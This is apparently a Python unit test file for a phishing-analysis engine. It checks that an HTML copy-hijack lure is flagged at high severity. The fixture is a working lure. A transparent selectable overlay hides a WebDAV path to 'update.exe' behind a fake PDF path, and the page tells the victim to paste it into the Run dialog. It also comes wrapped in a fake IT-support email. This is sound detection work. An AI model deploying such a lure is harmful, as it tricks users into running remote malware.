import tempfile
import unittest
from pathlib import Path

from fishstop_engine.analyzer.html_deception import analyze_html_copy_deception
from fishstop_engine.analyzer.soc_analyzer import EmlSOCAnalyzer


COPY_HIJACK_HTML = r"""
<html><head><style>
.copy-field { position: relative; }
.visible-text { display: inline-block; }
.hidden-overlay {
  position: absolute; top: 0; left: 0; width: 100%; height: 100%;
  color: rgba(0, 0, 0, 0); z-index: 10; user-select: text;
}
</style></head><body>
<p>Select and copy the file path below, then paste it into File Explorer or Run dialog (Win+R).</p>
<div class="copy-field">
  <div class="visible-text">C:\Users\Public\Documents\Q4_Report_2025.pdf</div>
  <div class="hidden-overlay">\\webdav-server.example\share\update.exe</div>
</div>
</body></html>
"""


class HtmlCopyDeceptionTests(unittest.TestCase):
    def test_transparent_selectable_overlay_exposes_hidden_executable_path(self):
        result = analyze_html_copy_deception(COPY_HIJACK_HTML)

        self.assertEqual("suspicious", result["status"])
        finding = result["findings"][0]
        self.assertEqual("transparent_selectable_overlay", finding["technique"])
        self.assertEqual("high", finding["severity"])
        self.assertIn("Q4_Report_2025.pdf", finding["visible_text"])
        self.assertEqual(
            [r"\\webdav-server.example\share\update.exe"],
            finding["dangerous_paths"],
        )

    def test_soc_report_promotes_copy_hijack_to_high_severity(self):
        raw = (
            "From: IT Support <it-support@example.com>\r\n"
            "To: employee@example.com\r\n"
            "Subject: Report - Action Required\r\n"
            "MIME-Version: 1.0\r\n"
            "Content-Type: text/html; charset=utf-8\r\n\r\n"
            f"{COPY_HIJACK_HTML}\r\n"
        ).encode("utf-8")
        with tempfile.TemporaryDirectory() as directory:
            path = Path(directory) / "copy-hijack.eml"
            path.write_bytes(raw)
            report = EmlSOCAnalyzer().analyze(str(path))

        findings = report["html_copy_deception"]["findings"]
        self.assertTrue(any(item["severity"] == "high" for item in findings))
        flags = report["flags"]
        self.assertTrue(any(
            item["level"] == "HIGH" and item["field"] == "HTML copy deception"
            for item in flags
        ))


if __name__ == "__main__":
    unittest.main()
